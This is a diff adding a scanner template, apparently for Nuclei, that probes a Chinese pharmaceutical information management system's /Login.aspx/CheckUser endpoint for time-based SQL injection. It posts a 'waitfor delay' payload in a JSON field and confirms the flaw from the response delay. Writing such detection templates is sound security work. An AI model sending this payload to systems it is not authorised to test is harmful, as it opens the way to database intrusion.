@@ -1,0 +1,34 @@
+id: poc-yaml-qianyiyun-mims-checkuser-sqli
+info:
+  name: 千宜医药信息管理系统 CheckUser SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+variables:
+  t1: "{{rand_int(5,10)}}"
+  t2: "{{to_number(t1) + 2}}"
+http:
+  - method: POST
+    path:
+      - "/Login.aspx/CheckUser"
+    headers:
+      Content-Type: application/json; charset=utf-8
+    body: |-
+      {"value":"' waitfor delay '0:0:{{t1}}'--+"}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '{"d":""}'
+      - type: word
+        part: header
+        words:
+          - "application/json"
+      - type: dsl
+        dsl:
+          - "duration >= to_number(t1)"
+          - "duration <= to_number(t2)"
